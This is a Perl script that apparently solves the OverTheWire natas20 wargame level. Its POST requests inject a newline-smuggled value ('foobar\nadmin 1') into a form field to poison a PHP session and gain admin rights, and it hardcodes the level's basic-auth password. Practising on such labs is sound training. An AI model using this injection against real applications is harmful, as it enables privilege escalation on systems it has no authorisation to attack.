#!/usr/bin/perl
use strict;
use warnings;
use v5.10;
use LWP::UserAgent;
use HTTP::Request::Common;
use HTTP::Cookies;
use Try::Tiny;

my $url = 'http://natas20.natas.labs.overthewire.org/index.php?debug=1';
my $ua = LWP::UserAgent->new(
  cookie_jar => HTTP::Cookies->new()
);

sub make_request_with {
  my $request = POST $url, Content => [ name => shift ];
  $request->authorization_basic('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF');
  my $response = $ua->request($request);
  print $response->content;
}

# make first request to create session
make_request_with("foobar");

# make second request with malicious payload so poison session
make_request_with("foobar\nadmin 1");

# make third request to load poisoned session
make_request_with("foobar\nadmin 1");